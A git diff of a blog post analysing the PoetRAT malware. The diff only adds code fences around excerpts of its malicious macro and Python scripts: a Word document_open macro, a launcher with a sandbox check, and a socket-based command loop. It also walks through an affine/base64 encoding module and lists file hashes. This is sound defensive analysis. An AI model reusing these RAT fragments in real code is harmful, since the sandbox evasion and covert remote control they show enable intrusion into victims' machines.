@@ -78,7 +78,7 @@ By using **ViperMonkey** I was able to extract the VBA macros
 ![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image3.png?raw=true)
 
 # Extracted VBA macro
-
+```VBA
 from vb2py.vbfunctions import \*\
 from vb2py.vbdebug import \*\
 def document_open():\
@@ -162,7 +162,7 @@ def deay(min):\
         **while** **not** (( Time() > ptr )):\
             pass\
     **return** fn_return_value
-
+```
 # VBA Macro Analysis
 
 At first it copies the document file to
@@ -171,7 +171,7 @@ At first it copies the document file to
 Then it executes "**bin2var**" function which extracts the latest
 "**7074638 Bytes**" from the document and creates "**smile.zip**", So
 this python script can be used to extract the zip file from the document
-
+```python
 f = open(\'Sample1\', \'rb\')
 
 content = f.read()
@@ -185,7 +185,7 @@ z.write(zip_file)
 f.close()
 
 z.close()
-
+```
 then it unzips it into "**C:\\Users\\Public\\ Python37**", Apparently
 the extracted files are **python version 3.7** and some **malicious
 scripts**
@@ -200,7 +200,7 @@ Then it launches the "**Launcher.py**" script
 # Malicious scripts analysis
 
 ## **Launcher.py**
-
+```python
 import shutil\
 import sys\
 import time\
@@ -238,7 +238,7 @@ fold = me\[:me.rfind(\"\\\\\") + 1\]\
         **open**(fold + \"frown.py\", \"w\").write(d)\
         **open**(fold + \".key\", \"w+\").write(uu)\
         police()
-
+```
 If there are **no arguments passed**
 
 -   It will check the **containing disk size**, if it\'s less than **64gb** then it would be **sandbox** 
@@ -265,7 +265,7 @@ This function is basically launched under two cases, the first one is
 **after writing ".key" file**.
 
 ## **Smile.py** 
-
+```python
 import multiprocessing\
 import sys\
 from colorama import init as c_init, Fore, Style\
@@ -316,7 +316,7 @@ wanted = True\
     sys.exit(0)\
 **if** \_\_name\_\_ == \"\_\_main\_\_\":\
     main()
-
+```
 it executes the communication function whilst the victim is still
 **wanted**, this status means that the victim is still a matter of
 interest.
@@ -340,7 +340,7 @@ interest.
     terminated by then**.
 
 ## **Frown.py**
-
+```python
 **def** recv(size, wait=False):\
     ready = select.select(\[sock\], \[\], \[\], 187)\
     **if** wait:\
@@ -446,7 +446,7 @@ interest.
         **except** Exception as a:\
             **if** is_connected():\
                 sock.send(**str**(a).encode())
-
+```
 So basically, how this works?
 
 -   At first it waits **83 secs** then it will wait till "**smile.py**"
@@ -488,7 +488,7 @@ if malware received:
 **This process is going to be repeated until "exit, dis" is received.**
 
 ## **Affine.py**
-
+```python
 import base64\
 **class** Affine(**object**):\
     DIE = 128\
@@ -516,7 +516,7 @@ import base64\
             **pass**\
         st = \"\".join(**map**(self.decrypt_char, string))\
         **return** base64.b64decode(st.encode()).decode(\"utf-8\")
-
+```
 Affine script is used as encryption/decryption module it's initialized
 in all scripts communicating through "**Abibliophobia23**" file, noting
 that all writing/reading this file is always accompanied by
@@ -593,14 +593,12 @@ the malware to steal their money.
 5.  **smile.py**\
     SHA256
     252C5D491747A42175C7C57CCC5965E3A7B83EB5F964776EF108539B0A29B2EE
-    
 6.  **smile_funs.py**\
     SHA256
     312F54943EBFD68E927E9AA95A98CA6F2D3572BF99DA6B448C5144864824C04D
 7.  **backer.py**\
     SHA256
     CA8492139C556EAC6710FE73BA31B53302505A8CC57338E4D2146BDFA8F69BDB**\
-    
 8.  **affine.py**\
     SHA256
     B1E7DC16E24EBEB60BC6753C54E940C3E7664E9FCB130BD663129ECDB5818FCD
